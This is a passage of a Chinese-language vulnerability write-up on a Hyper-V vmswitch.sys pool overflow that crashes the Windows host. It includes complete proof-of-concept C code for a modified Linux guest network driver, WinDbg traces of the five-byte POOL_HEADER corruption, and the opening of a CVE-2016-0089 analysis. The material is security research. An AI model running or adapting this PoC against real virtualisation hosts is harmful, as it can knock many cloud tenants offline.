
该漏洞需要连续运行两次`vmswitch!VmsMpCommonPvtHandleMulticastOids`函数才能触发。

第一次执行`vmswitch!VmsMpCommonPvtHandleMulticastOids`函数时，会先分配一个大小为`set->info_buflen`的内存，然后在`offset+0x143`、`offset+0x14A`处分别保存分配的内存地址以及`set->info_buflen/6`的值。

第二次执行`vmswitch!VmsMpCommonPvtHandleMulticastOids`函数时，会先检查`set->info_buflen/6`的值是否和第一次执行时在`offset+0x14A`的值相等。简单来说，就是检查第二次调用`vmswitch!VmsMpCommonPvtHandleMulticastOid`函数时，`set->info_buflen`整除`6`的值必须相等。比如第一次调用时`set->info_buflen = 60`，第二次调用时`set->info_buflen`可以为`65`，它们的整除结果是一样的，所以第二次调用函数时相对于上次`set->info_buflen`最大偏移为`5`字节。

随后代码运行到`offset+144EB`，由于第一次调用时分配的`buffer`大小只有`set->info_buflen = extlen`，但是现在需要向这个内存中拷贝`extlen+5`字节的数据，直接导致覆盖下个堆块的前`5`字节，破坏了`POOL_HEADER`。在系统`free`后面这块内存时抛出异常，导致蓝屏。

## 5.2. PoC编写与漏洞触发

这里，我们使用Linux作为虚拟机系统。由于Linux内核可以随意修改，所以减少了编写PoC的难度，笔者的Linux内核版本为`4.7.2`。

这里我们的PoC可以直接通过修改Hyper-V在Linux内核驱动代码实现，故我们在`./linux-4.7.2/drivers/net/hyperv/rndis_filter.c`文件中添加如下代码：

```c
static int rndis_filter_query_device_mac(struct rndis_device *dev)

{//这个函数是Linux Kernel中原有的函数，我们需要修改它

u32 size = ETH_ALEN;

rndis_pool_overflow(dev);//这是我们加上的语句

return rndis_filter_query_device(dev,

RNDIS_OID_802_3_PERMANENT_ADDRESS,

dev->hw_mac_adr, &size);

}

//下面为新增加的函数，用于触发漏洞

static int rndis_pool_overflow(struct rndis_device *rdev)

{

int ret;

  struct net_device *ndev = rdev->ndev;

  struct rndis_request *request;

  struct rndis_set_request *set;

  struct rndis_set_complete *set_complete;

  u32 extlen = 16 * 6;

  unsigned long t;

  request = get_rndis_request(

    rdev, RNDIS_MSG_SET,

    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen);

  if (!request)

    return -ENOMEM;

  set = &request->request_msg.msg.set_req;

  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST

  set->info_buflen = extlen;

  set->info_buf_offset = sizeof(struct rndis_set_request);

  set->dev_vc_handle = 0;

  ret = rndis_filter_send_request(rdev, request);//将数据发送至宿主机

  if (ret != 0)

    goto cleanup;

  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);

  if (t == 0)

    return -ETIMEDOUT;

  else {

    set_complete = &request->response_msg.msg.set_complete;

    if (set_complete->status != RNDIS_STATUS_SUCCESS) {

      printk(KERN_INFO "failed to set multicast list: 0x%x\n",

        set_complete->status);

      ret = -EINVAL;

    }

  }

  put_rndis_request(rdev, request);

  request = get_rndis_request(rdev, RNDIS_MSG_SET,

    RNDIS_MESSAGE_SIZE(struct rndis_set_request) + extlen + 5);

  if (!request)

    return -ENOMEM;

  set = &request->request_msg.msg.set_req;

  set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST

  set->info_buflen = extlen + 5;

  set->info_buf_offset = sizeof(struct rndis_set_request);

  set->dev_vc_handle = 0;

  ret = rndis_filter_send_request(rdev, request); //将数据发送至宿主机

  if (ret != 0)

    goto cleanup;

  t = wait_for_completion_timeout(&request->wait_event, 5*HZ);

  if (t == 0)

    return -ETIMEDOUT;

  else {

    set_complete = &request->response_msg.msg.set_complete;

    if (set_complete->status != RNDIS_STATUS_SUCCESS) {

      printk(KERN_INFO "failed to set multicast list: 0x%x\n",

        set_complete->status);

      ret = -EINVAL;

    }

 }

cleanup:

  put_rndis_request(rdev, request);

  return ret;

}

```

从PoC中的代码可以看出，新增的函数`rndis_pool_overflow`连续发送了两次数据。上面代码中设置`set->oid = 0x01010209; // OID_802_3_MULTICAST_LIST`是为了保证虚拟机传来的数据能走到`vmswitch!VmsMpCommonPvtHandleMulticastOids`函数。

两次发送的数据中，`set->info_buflen`字段的值分别为`extlen`和`extlen+5`，印证了上面分析过程中的`5`字节溢出。

保存文件，并且重新编译内核。重启Linux宿主机后，Linux系统正常启动，并没有什么异常，但是此时已经发生了溢出。现在只需要关掉虚拟机，让Windows内核回收被溢出的那块内存，便会发生蓝屏，如图1-35。

![](https://bbs.kanxue.com/upload/attach/201711/624619_hxchq6o8wxk3ioh.png)

图1-35

## 5.3. 调试

在WinDbg中设置`VmsMpCommonPvtHandleMulticastOids+144f8`处断点，分别观察两次调用`VmsMpCommonPvtHandleMulticastOids`函数后调用`memmove`前后的内存对比。

```text
3: kd> bp vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144f8

3: kd> g

Breakpoint 0 hit

vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144f8:

fffff801`b3940b38 e8c396ffff      call    vmswitch!memcpy (fffff801`b393a200)

3: kd> db rcx-10

ffffe001`7501d950  10 00 07 02 56 4d 63 6d-33 eb 5f 64 e6 5b 43 5e  ....VMcm3._d.[C^

ffffe001`7501d960  48 48 48 48 48 48 48 48-48 48 48 48 48 48 48 48  HHHHHHHHHHHHHHHH

ffffe001`7501d970  48 48 48 48 48 48 48 48-48 48 48 48 48 48 48 48  HHHHHHHHHHHHHHHH

ffffe001`7501d980  48 48 48 48 48 48 48 48-00 00 00 00 00 00 00 00  HHHHHHHH........

ffffe001`7501d990  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

ffffe001`7501d9a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

ffffe001`7501d9b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

ffffe001`7501d9c0  07 00 08 04 45 76 65 6e-a3 eb 5f 64 e6 5b 43 5e  ....Even.._d.[C^

3: kd> p

vmswitch!VmsMpCommonPvtHandleMulticastOids+0x144fd:

fffff801`b3940b3d 90              nop

3: kd> db ffffe001`7501d950

ffffe001`7501d950  10 00 07 02 56 4d 63 6d-33 eb 5f 64 e6 5b 43 5e  ....VMcm3._d.[C^

ffffe001`7501d960  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d970  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d980  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d990  49 49 49 49 49 49 49 49-49 49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d9a0  49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d9b0  49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49 49  IIIIIIIIIIIIIIII

ffffe001`7501d9c0  49 49 49 49 49 76 65 6e-a3 eb 5f 64 e6 5b 43 5e  IIIIIven.._d.[C^

3: kd> g

```

通过上面，可以发现下一个堆块的`POOL_HEADER`已经被垃圾数据破坏了`5`字节。如果内核释放这部分内存，则会触发`BugCheck`。

```text
1: kd> !analyze -v

*******************************************************************************

*                                                                             *

*                        Bugcheck Analysis                                    *

*                                                                             *

*******************************************************************************



BAD_POOL_HEADER (19)

The pool is already corrupt at the time of the current request.

This may or may not be due to the caller.

The internal pool links must be walked to figure out a possible cause of

the problem, and then special pool applied to the suspect tags or the driver

verifier to a suspect driver.

Arguments:

Arg1: 0000000000000020, a pool block header size is corrupt.

Arg2: ffffe0017501d9c0, The pool entry we were looking for within the page.

Arg3: ffffe0017501de50, The next pool entry.

Arg4: 0000000004494949, (reserved)



Debugging Details:

------------------





ffffe0017501d9c0 doesn't look like a valid small pool allocation, checking to see

if the entire page is actually part of a large page allocation...



```

`POOL_HEADER`的结构如下。

```c
typedef struct _POOL_HEADER

{

  union

  {

    struct

    {

    /*0x000*/ ULONG32 PreviousSize : 8;

    /*0x000*/ ULONG32 PoolIndex : 8;

    /*0x000*/ ULONG32 BlockSize : 8;

    /*0x000*/ ULONG32 PoolType : 8;

    };

    /*0x000*/ ULONG32 Ulong1;

  };

  /*0x004*/ ULONG32 PoolTag;

  union

  {

  /*0x008*/ struct _EPROCESS* ProcessBilled;

    struct

    {

    /*0x008*/ UINT16 AllocatorBackTraceIndex;

    /*0x00A*/ UINT16 PoolTagHash;

    /*0x00C*/ UINT8 _PADDING0_[0x4];

    };

  };

} POOL_HEADER, *PPOOL_HEADER;

```

可以看到，这个漏洞将`POOL_HEADER`结构的前五个字节，即`PreviousSize`、`PoolIndex`、`BlockSize`、`PoolType`和部分`PoolTag`覆盖掉，导致宿主机系统崩溃。

## 5.4. 总结

可以看到，因为Hyper-V特殊的宿主机和虚拟机之间的关系，一旦Hyper-V宿主机中的驱动出现问题，那么对整个云系统的打击可以说是非常大的。哪怕不能造成代码执行，也可以造成大面积云上业务的下线。这个漏洞较为简单，可以作为Hyper-V安全研究的范例。

# 6. Cve-2016-0089的分析、触发、调试

本节漏洞同样是由Google Project Zero团队发现的，问题出在`vmswitch.sys`组件上，会导致Windows宿主机的崩溃，造成DoS。这个漏洞是在Microsoft Windows Server 2012 R2 Standard x64且未安装任何补丁的操作系统版本上触发。

## 6.1. 漏洞分析

该漏洞问题处在`vmswitch!VmsVmNicHandleRssParametersChange`函数中，是越界读到非法的内存区域导致宿主机内核崩溃。下面我们通过部分IDA中代码来探究问题所在。
